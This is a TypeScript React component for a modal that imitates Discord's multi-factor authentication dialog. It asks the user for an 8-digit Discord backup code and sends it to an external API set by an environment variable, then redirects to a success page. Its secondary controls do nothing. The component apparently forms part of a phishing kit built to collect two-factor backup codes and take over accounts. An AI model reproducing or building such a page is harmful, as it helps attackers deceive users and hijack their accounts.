"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { X } from "lucide-react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"

export default function AuthModal() {
  const [code, setCode] = useState("")
  const router = useRouter()

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    try {
      const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/api/verify`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ code }),
      })

      if (response.ok) {
        router.push("/success")
      } else {
        // Handle error, maybe show an error message to the user
        console.error("Verification failed")
      }
    } catch (error) {
      console.error("Verification failed:", error)
    }
  }

  return (
    <div className="w-[440px] bg-[#2b2d31] rounded-md shadow-lg p-6 relative z-10">
      <div className="flex justify-between items-center mb-6">
        <h2 className="text-2xl font-semibold text-white">Multi-Factor Authentication</h2>
        <button className="text-gray-400 hover:text-white">
          <X className="h-5 w-5" />
        </button>
      </div>

      <form onSubmit={handleSubmit}>
        <div className="space-y-4">
          <div>
            <p className="text-sm text-gray-400 uppercase tracking-wide mb-2">Enter Discord Backup Code</p>
            <Input
              type="text"
              placeholder="8-digit backup code"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              className="w-full bg-[#1e1f22] border-none text-white placeholder:text-gray-500"
              maxLength={8}
            />
          </div>

          <div className="flex items-center justify-between pt-2">
            <span className="text-[#949cf7] opacity-65 text-sm cursor-default">Verify with something else</span>
            <Button type="submit" className="bg-[#5865f2] hover:bg-[#4752c4] text-white px-4">
              Confirm
            </Button>
          </div>
        </div>
      </form>
    </div>
  )
}


